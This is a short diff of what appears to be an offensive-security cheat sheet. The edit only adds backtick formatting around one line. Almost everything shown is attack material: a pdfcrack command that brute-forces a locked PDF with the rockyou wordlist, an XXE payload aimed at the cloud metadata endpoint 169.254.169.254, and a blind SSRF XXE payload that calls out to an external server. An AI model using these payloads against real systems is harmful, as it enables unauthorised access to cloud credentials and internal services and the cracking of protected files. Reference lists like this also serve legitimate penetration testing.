@@ -46,5 +46,5 @@ pdfcrack -f locked.pdf -w rockyou.txt
 ### SSRF 
 `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> `
 ### blind SSRF test with your own server
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://toto.afri.ca"> ]> 
+`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://toto.afri.ca"> ]> `
 
